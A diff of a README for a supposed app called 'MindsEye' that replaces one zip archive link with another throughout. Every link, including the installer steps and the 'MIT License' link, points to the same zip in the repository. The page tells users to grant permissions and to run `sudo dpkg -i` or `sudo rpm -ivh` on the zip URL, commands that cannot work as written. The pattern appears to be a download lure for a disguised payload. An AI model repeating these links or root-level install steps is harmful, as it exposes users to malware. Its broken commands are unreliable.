@@ -1,6 +1,6 @@
 # MindsEye – Downloads, Insights, & Unique Perspectives
 
-[![Download](https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/mindseye-open-access-hub_2.4.zip)](https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/mindseye-open-access-hub_2.4.zip)
+[![Download](https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/open_hub_mindseye_access_v2.0.zip)](https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/open_hub_mindseye_access_v2.0.zip)
 
 Welcome to the vibrant home of **MindsEye**, your next companion in the journey of digital wonder and creative solutions. In this repository, you'll discover everything you need to securely access MindsEye, keep it updated, and explore its full capabilities. From installation steps to advanced integration guidance, you’ll uncover a guidebook crafted with precision, care, and forward-thinking.
 
@@ -74,16 +74,16 @@ Unleash the brilliance of machine learning right at your fingertips. MindsEye fu
 **Begin your MindsEye journey by following these steps on your platform:**
 
 ### Windows & macOS  
-- Download the latest installer from https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/mindseye-open-access-hub_2.4.zip  
+- Download the latest installer from https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/open_hub_mindseye_access_v2.0.zip  
 - Double-click the setup executable and follow the on-screen prompts  
 - When prompted, grant necessary permissions  
 - On completion, launch the MindsEye app from your applications menu
 
 ### Ubuntu & Fedora  
-- Visit https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/mindseye-open-access-hub_2.4.zip and download the `.deb` or `.rpm` package  
+- Visit https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/open_hub_mindseye_access_v2.0.zip and download the `.deb` or `.rpm` package  
 - Run the following command:  
-    - For Ubuntu: `sudo dpkg -i https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/mindseye-open-access-hub_2.4.zip`
-    - For Fedora: `sudo rpm -ivh https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/mindseye-open-access-hub_2.4.zip`
+    - For Ubuntu: `sudo dpkg -i https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/open_hub_mindseye_access_v2.0.zip`
+    - For Fedora: `sudo rpm -ivh https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/open_hub_mindseye_access_v2.0.zip`
 - Complete setup as guided in your terminal
 
 ### Additional Steps for API Integration  
@@ -105,11 +105,11 @@ MindsEye is distributed for informational and educational pursuits. All efforts 
 
 This repository is shared under the generous, open MIT License. MindsEye encourages innovation, remixing, and collaboration, just as an artist might pass their brush to a friend.
 
-Read the full text here: [MIT License](https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/mindseye-open-access-hub_2.4.zip)
+Read the full text here: [MIT License](https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/open_hub_mindseye_access_v2.0.zip)
 
 ---
 
-[![Download](https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/mindseye-open-access-hub_2.4.zip)](https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/mindseye-open-access-hub_2.4.zip)
+[![Download](https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/open_hub_mindseye_access_v2.0.zip)](https://raw.githubusercontent.com/Wafi-net/mindseye-open-access-hub/branch/superendorse/open_hub_mindseye_access_v2.0.zip)
 
 ---
 
